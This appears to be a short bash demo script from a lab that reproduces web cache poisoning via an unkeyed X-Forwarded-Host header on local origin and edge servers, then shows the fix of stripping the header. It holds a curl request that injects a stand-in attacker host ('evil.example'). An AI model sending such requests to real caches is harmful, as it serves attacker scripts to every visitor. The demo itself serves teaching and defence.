#!/usr/bin/env bash
# poison.sh - web cache poisoning with an unkeyed header (Kettle, 2018).
source "$(dirname "$0")/lib.sh"
origin 9240
edge 8240 --origin 127.0.0.1:9240 --cache-prefix /page/
edge 8241 --origin 127.0.0.1:9240 --cache-prefix /page/ --strip-unkeyed

say "the attacker sends one request with a header the cache key ignores"
run "$CURL -H 'X-Forwarded-Host: evil.example' localhost:8240/page/landing"
say "every visitor for the next 60 s gets the attacker's script"
run "$CURL localhost:8240/page/landing"
run hdrs localhost:8240/page/landing

say "fix: the edge drops the header (or puts it in the cache key, or the origin says Vary)"
run "$CURL -H 'X-Forwarded-Host: evil.example' localhost:8241/page/landing"
run "$CURL localhost:8241/page/landing"
